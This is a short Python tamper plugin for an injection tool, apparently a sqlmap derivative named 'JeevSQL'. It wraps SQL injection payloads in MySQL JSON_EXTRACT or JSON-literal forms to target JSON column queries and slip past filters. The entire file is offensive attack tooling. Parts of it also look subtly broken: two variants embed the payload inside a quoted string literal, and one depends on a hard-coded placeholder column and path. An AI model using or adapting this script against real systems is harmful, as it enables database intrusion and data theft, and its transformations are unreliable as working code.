#!/usr/bin/env python
# JeevSQL Tamper: jsonpath - by Jeevraj
# Converts SQL payloads to JSONPath-based injection for JSON column queries.
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies(): pass

def tamper(payload, **kwargs):
    if not payload:
        return payload
    # Wrap payload for MySQL JSON_EXTRACT / PostgreSQL ->> operator contexts
    import random
    variants = [
        "JSON_EXTRACT('{\"a\":\"%s\"}','$.a')" % payload.replace("'", "\\'"),
        "'[{\"key\":\"%s\"}]'" % payload.replace("'", "\\'"),
        "JSON_UNQUOTE(JSON_EXTRACT(column,'$.field')) %s" % payload,
    ]
    return random.choice(variants)
